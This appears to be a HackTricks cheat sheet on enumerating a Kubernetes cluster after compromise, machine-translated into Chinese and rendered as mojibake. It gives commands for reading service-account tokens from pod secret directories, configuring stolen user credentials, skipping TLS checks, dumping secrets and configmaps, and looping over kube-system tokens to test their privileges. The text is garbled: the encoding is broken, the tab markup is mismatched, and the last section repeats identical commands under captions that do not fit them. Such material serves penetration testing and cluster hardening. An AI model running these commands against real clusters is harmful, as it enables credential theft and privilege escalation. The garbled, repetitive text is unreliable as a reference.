# Kubernetesæšä¸¾

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„è´¦å· ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## Kubernetesä»¤ç‰Œ

å¦‚æœæ‚¨å·²ç»è·å¾—å¯¹æŸå°æœºå™¨çš„è®¿é—®æƒé™ï¼Œç”¨æˆ·å¯èƒ½å¯ä»¥è®¿é—®æŸäº›Kuberneteså¹³å°ã€‚ä»¤ç‰Œé€šå¸¸ä½äºç”±**ç¯å¢ƒå˜é‡`KUBECONFIG`**æˆ–**`~/.kube`**æŒ‡å‘çš„æ–‡ä»¶ä¸­ã€‚

åœ¨æ­¤æ–‡ä»¶å¤¹ä¸­ï¼Œæ‚¨å¯èƒ½ä¼šæ‰¾åˆ°é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«è¿æ¥åˆ°APIæœåŠ¡å™¨çš„**ä»¤ç‰Œå’Œé…ç½®**ã€‚åœ¨æ­¤æ–‡ä»¶å¤¹ä¸­ï¼Œæ‚¨è¿˜å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåŒ…å«å…ˆå‰æ£€ç´¢åˆ°çš„ä¿¡æ¯çš„ç¼“å­˜æ–‡ä»¶å¤¹ã€‚

å¦‚æœæ‚¨å·²ç»åœ¨Kubernetesç¯å¢ƒä¸­çš„ä¸€ä¸ªpodä¸­è·å¾—äº†è®¿é—®æƒé™ï¼Œåˆ™è¿˜æœ‰å…¶ä»–åœ°æ–¹å¯ä»¥æ‰¾åˆ°ä»¤ç‰Œå’Œæœ‰å…³å½“å‰K8ç¯å¢ƒçš„ä¿¡æ¯ï¼š

### æœåŠ¡è´¦æˆ·ä»¤ç‰Œ

åœ¨ç»§ç»­ä¹‹å‰ï¼Œå¦‚æœæ‚¨ä¸çŸ¥é“Kubernetesä¸­çš„æœåŠ¡æ˜¯ä»€ä¹ˆï¼Œè¯·**ç‚¹å‡»æ­¤é“¾æ¥å¹¶è‡³å°‘é˜…è¯»æœ‰å…³Kubernetesæ¶æ„çš„ä¿¡æ¯**ã€‚

æ¥è‡ªKubernetes [æ–‡æ¡£](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server)ï¼š

_"å½“æ‚¨åˆ›å»ºä¸€ä¸ªpodæ—¶ï¼Œå¦‚æœæ‚¨æ²¡æœ‰æŒ‡å®šæœåŠ¡è´¦æˆ·ï¼Œå®ƒå°†è‡ªåŠ¨åˆ†é…ç»™åŒä¸€å‘½åç©ºé—´ä¸­çš„_é»˜è®¤_æœåŠ¡è´¦æˆ·ã€‚"_

**ServiceAccount**æ˜¯ç”±Kubernetesç®¡ç†çš„å¯¹è±¡ï¼Œç”¨äºä¸ºåœ¨podä¸­è¿è¡Œçš„è¿›ç¨‹æä¾›èº«ä»½ã€‚\
æ¯ä¸ªæœåŠ¡è´¦æˆ·éƒ½æœ‰ä¸€ä¸ªä¸ä¹‹ç›¸å…³çš„å¯†é’¥ï¼Œè¯¥å¯†é’¥åŒ…å«ä¸€ä¸ªä»¤ç‰Œã€‚è¿™æ˜¯ä¸€ä¸ªJSON Web Tokenï¼ˆJWTï¼‰ï¼Œç”¨äºåœ¨ä¸¤ä¸ªå‚ä¸æ–¹ä¹‹é—´å®‰å…¨åœ°è¡¨ç¤ºå£°æ˜çš„æ–¹æ³•ã€‚

é€šå¸¸ï¼Œ**ä¸€ä¸ª**ç›®å½•ä¸­ï¼š

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

åŒ…å«ä»¥ä¸‹æ–‡ä»¶ï¼š

* **ca.crt**ï¼šç”¨äºæ£€æŸ¥Kubernetesé€šä¿¡çš„CAè¯ä¹¦
* **namespace**ï¼šæŒ‡ç¤ºå½“å‰å‘½åç©ºé—´
* **token**ï¼šåŒ…å«å½“å‰podçš„**æœåŠ¡ä»¤ç‰Œ**ã€‚

ç°åœ¨æ‚¨å·²ç»è·å¾—äº†ä»¤ç‰Œï¼Œå¯ä»¥åœ¨ç¯å¢ƒå˜é‡**`KUBECONFIG`**ä¸­æ‰¾åˆ°APIæœåŠ¡å™¨ã€‚è¦è·å–æ›´å¤šä¿¡æ¯ï¼Œè¯·è¿è¡Œ`(env | set) | grep -i "kuber|kube`**`"`**

æœåŠ¡è´¦æˆ·ä»¤ç‰Œç”±æ–‡ä»¶**sa.key**ä¸­çš„å¯†é’¥ç­¾åï¼Œå¹¶ç”±**sa.pub**éªŒè¯ã€‚

**Kubernetes**ä¸Šçš„é»˜è®¤ä½ç½®ï¼š

* /etc/kubernetes/pki

**Minikube**ä¸Šçš„é»˜è®¤ä½ç½®ï¼š

* /var/lib/localkube/certs

### çƒ­pod

_**çƒ­podæ˜¯**_åŒ…å«ç‰¹æƒæœåŠ¡è´¦æˆ·ä»¤ç‰Œçš„podã€‚ç‰¹æƒæœåŠ¡è´¦æˆ·ä»¤ç‰Œæ˜¯å…·æœ‰æ‰§è¡Œç‰¹æƒä»»åŠ¡ï¼ˆå¦‚åˆ—å‡ºå¯†é’¥ã€åˆ›å»ºpodç­‰ï¼‰æƒé™çš„ä»¤ç‰Œã€‚

## RBAC

å¦‚æœæ‚¨ä¸çŸ¥é“ä»€ä¹ˆæ˜¯**RBAC**ï¼Œè¯·**é˜…è¯»æœ¬èŠ‚**ã€‚

## æšä¸¾å¤‡å¿˜å•

ä¸ºäº†æšä¸¾K8sç¯å¢ƒï¼Œæ‚¨éœ€è¦ä»¥ä¸‹å‡ ç‚¹ï¼š

* ä¸€ä¸ª**æœ‰æ•ˆçš„èº«ä»½éªŒè¯ä»¤ç‰Œ**ã€‚åœ¨å‰ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†åœ¨å“ªé‡Œæœç´¢ç”¨æˆ·ä»¤ç‰Œå’ŒæœåŠ¡è´¦æˆ·ä»¤ç‰Œã€‚
* Kubernetes APIçš„**åœ°å€ï¼ˆ_**https://host:port**_**ï¼‰**ã€‚è¿™é€šå¸¸å¯ä»¥åœ¨ç¯å¢ƒå˜é‡å’Œ/æˆ–kubeé…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°ã€‚
* **å¯é€‰é¡¹**ï¼šç”¨äºéªŒè¯APIæœåŠ¡å™¨çš„**ca.crt**ã€‚è¿™å¯ä»¥åœ¨ä¸ä»¤ç‰Œç›¸åŒçš„ä½ç½®æ‰¾åˆ°ã€‚è¿™å¯¹äºéªŒè¯APIæœåŠ¡å™¨è¯ä¹¦å¾ˆæœ‰ç”¨ï¼Œä½†æ˜¯ä½¿ç”¨`kubectl`çš„`--insecure-skip-tls-verify`æˆ–`curl`çš„`-k`ï¼Œæ‚¨å°†ä¸éœ€è¦æ­¤é€‰é¡¹ã€‚

æœ‰äº†è¿™äº›è¯¦ç»†ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥**æšä¸¾Kubernetes**ã€‚å¦‚æœç”±äºæŸç§åŸå› ï¼Œ**APIå¯ä»¥é€šè¿‡Internetè®¿é—®**ï¼Œæ‚¨å¯ä»¥ç›´æ¥ä»ä¸»æœºä¸‹è½½è¯¥ä¿¡æ¯å¹¶æšä¸¾å¹³å°ã€‚

ç„¶è€Œï¼Œé€šå¸¸**APIæœåŠ¡å™¨ä½äºå†…éƒ¨ç½‘ç»œä¸­**ï¼Œå› æ­¤æ‚¨éœ€è¦é€šè¿‡å—æŸçš„æœºå™¨åˆ›å»ºä¸€ä¸ªéš§é“ï¼Œä»¥ä¾¿ä»æ‚¨çš„æœºå™¨è®¿é—®å®ƒï¼Œæˆ–è€…æ‚¨å¯ä»¥**ä¸Šä¼ **[**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)**äºŒè¿›åˆ¶æ–‡ä»¶**ï¼Œæˆ–ä½¿ç”¨**`curl/wget/anything`**æ‰§è¡ŒåŸå§‹HTTPè¯·æ±‚åˆ°APIæœåŠ¡å™¨ã€‚

### `list`å’Œ`get`åŠ¨è¯ä¹‹é—´çš„åŒºåˆ«

ä½¿ç”¨**`get`**æƒé™ï¼Œæ‚¨å¯ä»¥è®¿é—®ç‰¹å®šèµ„äº§çš„ä¿¡æ¯ï¼ˆ`kubectl`ä¸­çš„`describe`é€‰é¡¹ï¼‰APIï¼š
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
å¦‚æœæ‚¨æ‹¥æœ‰**`list`**æƒé™ï¼Œæ‚¨å¯ä»¥æ‰§è¡ŒAPIè¯·æ±‚æ¥åˆ—å‡ºä¸€ç§ç±»å‹çš„èµ„äº§ï¼ˆ`kubectl`ä¸­çš„`get`é€‰é¡¹ï¼‰ï¼š
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
å¦‚æœæ‚¨æ‹¥æœ‰**`watch`**æƒé™ï¼Œæ‚¨å¯ä»¥æ‰§è¡ŒAPIè¯·æ±‚æ¥ç›‘è§†èµ„äº§ï¼š
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
ä»–ä»¬æ‰“å¼€äº†ä¸€ä¸ªæµè¿æ¥ï¼Œæ¯å½“éƒ¨ç½²å‘ç”Ÿå˜åŒ–ï¼ˆæˆ–åˆ›å»ºæ–°çš„éƒ¨ç½²ï¼‰æ—¶ï¼Œå°±ä¼šè¿”å›å®Œæ•´çš„éƒ¨ç½²æ¸…å•ã€‚

{% hint style="danger" %}
ä»¥ä¸‹ `kubectl` å‘½ä»¤ä»…ç”¨äºåˆ—å‡ºå¯¹è±¡ã€‚å¦‚æœè¦è®¿é—®æ•°æ®ï¼Œéœ€è¦ä½¿ç”¨ `describe` è€Œä¸æ˜¯ `get`ã€‚
{% endhint %}

### ä½¿ç”¨ curl

ä»å®¹å™¨å†…éƒ¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å¤šä¸ªç¯å¢ƒå˜é‡ï¼š
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
é»˜è®¤æƒ…å†µä¸‹ï¼ŒPodå¯ä»¥é€šè¿‡åŸŸå`kubernetes.default.svc`è®¿é—®`kube-api server`ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥åœ¨`/etc/resolv.config`ä¸­çœ‹åˆ°kubeç½‘ç»œï¼Œå› ä¸ºåœ¨è¿™é‡Œæ‚¨å°†æ‰¾åˆ°kubernetes DNSæœåŠ¡å™¨çš„åœ°å€ï¼ˆåŒä¸€èŒƒå›´çš„â€œ.1â€æ˜¯kube-apiçš„ç»ˆç«¯èŠ‚ç‚¹ï¼‰ã€‚
{% endhint %}

### ä½¿ç”¨kubectl

æœ‰äº†ä»¤ç‰Œå’ŒAPIæœåŠ¡å™¨çš„åœ°å€ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨kubectlæˆ–curlæŒ‰ç…§ä»¥ä¸‹æŒ‡ç¤ºè®¿é—®å®ƒï¼š

é»˜è®¤æƒ…å†µä¸‹ï¼ŒAPISERVERä½¿ç”¨`https://`æ¨¡å¼è¿›è¡Œé€šä¿¡ã€‚
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> å¦‚æœURLä¸­æ²¡æœ‰`https://`ï¼Œä½ å¯èƒ½ä¼šæ”¶åˆ°ç±»ä¼¼"Bad Request"çš„é”™è¯¯ã€‚

ä½ å¯ä»¥åœ¨[**è¿™é‡Œæ‰¾åˆ°å®˜æ–¹çš„kubectlå¤‡å¿˜å•**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)ã€‚ä»¥ä¸‹å„èŠ‚çš„ç›®æ ‡æ˜¯ä»¥æœ‰åºçš„æ–¹å¼å‘ˆç°ä¸åŒçš„é€‰é¡¹ï¼Œä»¥æšä¸¾å’Œç†è§£ä½ å·²ç»è·å¾—è®¿é—®æƒé™çš„æ–°K8sã€‚

è¦æ‰¾åˆ°`kubectl`å‘é€çš„HTTPè¯·æ±‚ï¼Œå¯ä»¥ä½¿ç”¨å‚æ•°`-v=8`ã€‚

#### MitM kubectl - ä»£ç†åŒ–kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### å½“å‰é…ç½®

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

å¦‚æœä½ æˆåŠŸçªƒå–äº†ä¸€äº›ç”¨æˆ·çš„å‡­è¯ï¼Œä½ å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹çš„æ–¹å¼**åœ¨æœ¬åœ°é…ç½®å®ƒä»¬**ï¼š
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### è·å–æ”¯æŒçš„èµ„æº

é€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œæ‚¨å°†äº†è§£å¯ä»¥åˆ—å‡ºçš„æ‰€æœ‰æœåŠ¡

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### è·å–å½“å‰æƒé™

{% tabs %}
{% tab title="kubectl" %}ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å–å½“å‰ç”¨æˆ·çš„æƒé™ï¼š

```bash
kubectl auth can-i <verb> <resource>
```

ä¾‹å¦‚ï¼Œè¦æ£€æŸ¥å½“å‰ç”¨æˆ·æ˜¯å¦æœ‰è·å–æ‰€æœ‰Podçš„æƒé™ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```bash
kubectl auth can-i get pods --all-namespaces
```

å¦‚æœç”¨æˆ·å…·æœ‰è¯¥æƒé™ï¼Œå°†è¿”å›`yes`ï¼›å¦åˆ™ï¼Œå°†è¿”å›`no`ã€‚
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}APIæ¥å£{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

å¦ä¸€ç§æ£€æŸ¥æƒé™çš„æ–¹æ³•æ˜¯ä½¿ç”¨å·¥å…·ï¼š[**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹é“¾æ¥ä¸­äº†è§£æ›´å¤šå…³äº**Kubernetes RBAC**çš„ä¿¡æ¯ï¼š

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**ä¸€æ—¦æ‚¨çŸ¥é“æ‚¨æ‹¥æœ‰çš„æƒé™**ï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥ç¡®å®šæ˜¯å¦å¯ä»¥æ»¥ç”¨è¿™äº›æƒé™æ¥æå‡æƒé™ï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### è·å–å…¶ä»–è§’è‰²

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}APIæ¥å£{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### è·å–å‘½åç©ºé—´

Kubernetesæ”¯æŒç”±åŒä¸€ç‰©ç†é›†ç¾¤æ”¯æŒçš„**å¤šä¸ªè™šæ‹Ÿé›†ç¾¤**ã€‚è¿™äº›è™šæ‹Ÿé›†ç¾¤è¢«ç§°ä¸º**å‘½åç©ºé—´**ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}APIæ¥å£{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### è·å–ç§˜å¯†

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}APIæ¥å£{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

å¦‚æœä½ èƒ½è¯»å–secretsï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å–ä¸æ¯ä¸ªä»¤ç‰Œç›¸å…³çš„æƒé™ï¼š
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### è·å–æœåŠ¡è´¦æˆ·

æ­£å¦‚æœ¬é¡µé¢å¼€å¤´æ‰€è®¨è®ºçš„ï¼Œå½“ä¸€ä¸ª Pod è¿è¡Œæ—¶ï¼Œé€šå¸¸ä¼šä¸ºå…¶åˆ†é…ä¸€ä¸ªæœåŠ¡è´¦æˆ·ã€‚å› æ­¤ï¼Œåˆ—å‡ºæœåŠ¡è´¦æˆ·ã€å®ƒä»¬çš„æƒé™ä»¥åŠå®ƒä»¬æ‰€åœ¨çš„ä½ç½®å¯èƒ½ä¼šå…è®¸ç”¨æˆ·æå‡æƒé™ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}API
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### è·å–éƒ¨ç½²ä¿¡æ¯

éƒ¨ç½²ä¿¡æ¯æŒ‡å®šéœ€è¦è¿è¡Œçš„ç»„ä»¶ã€‚
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}API
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### è·å–Pods

Podsæ˜¯å®é™…è¿è¡Œçš„å®¹å™¨ã€‚
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}APIæ¥å£{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### è·å–æœåŠ¡

Kubernetes **æœåŠ¡**ç”¨äº**åœ¨ç‰¹å®šç«¯å£å’ŒIPä¸Šå…¬å¼€æœåŠ¡**ï¼ˆè¿™å°†ä½œä¸ºè´Ÿè½½å‡è¡¡å™¨ï¼Œç”¨äºæä¾›æœåŠ¡çš„å®é™…Podï¼‰ã€‚è¿™å¯¹äºäº†è§£å¯ä»¥æ‰¾åˆ°å…¶ä»–æœåŠ¡ä»¥å°è¯•æ”»å‡»çš„ä½ç½®å¾ˆæœ‰è¶£ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}APIæ¥å£{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### è·å–èŠ‚ç‚¹

è·å–é›†ç¾¤ä¸­é…ç½®çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}APIæ¥å£{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### è·å–DaemonSets

**DaemonSets** å…è®¸ç¡®ä¿é›†ç¾¤ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ï¼ˆæˆ–æ‰€é€‰èŠ‚ç‚¹ï¼‰ä¸Šè¿è¡Œç‰¹å®šçš„podã€‚å¦‚æœåˆ é™¤DaemonSetï¼Œå®ƒç®¡ç†çš„podä¹Ÿå°†è¢«åˆ é™¤ã€‚
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}APIæ¥å£{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### è·å– cronjob

Cron ä½œä¸šå…è®¸ä½¿ç”¨ç±»ä¼¼äº crontab çš„è¯­æ³•å®‰æ’å¯åŠ¨ä¸€ä¸ªå°†æ‰§è¡ŒæŸäº›æ“ä½œçš„ podã€‚
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}APIæ¥å£{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### è·å–configMap

configMapå§‹ç»ˆåŒ…å«å¤§é‡ä¿¡æ¯å’Œé…ç½®æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶æä¾›ç»™åœ¨Kubernetesä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚é€šå¸¸ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°è®¸å¤šç”¨äºè¿æ¥å’ŒéªŒè¯å…¶ä»–å†…éƒ¨/å¤–éƒ¨æœåŠ¡çš„å¯†ç ã€ç§˜å¯†å’Œä»¤ç‰Œã€‚
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}API
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% tab title="kubectl" %}

è·å–æ‰€æœ‰çš„èµ„æºç±»å‹ï¼š

```bash
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl get --show-kind --ignore-not-found -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹ï¼š

```bash
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl get -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œè¯¦ç»†ä¿¡æ¯ï¼š

```bash
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼š

```bash
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼š

```bash
kubectl api-resources --verbs=list --namespaced -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o yaml
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ JSON æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl get -n <namespace> -o json
```

è·å–æ‰€æœ‰çš„èµ„æºå®ä¾‹å’Œ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼ˆåŒ…æ‹¬æœªå‘½åç©ºé—´çš„èµ„æºï¼‰ï¼š

```bash
kubectl api-resources --verbs=list -o name | xargs -n 1 kubectl describe -n <namespace>
```

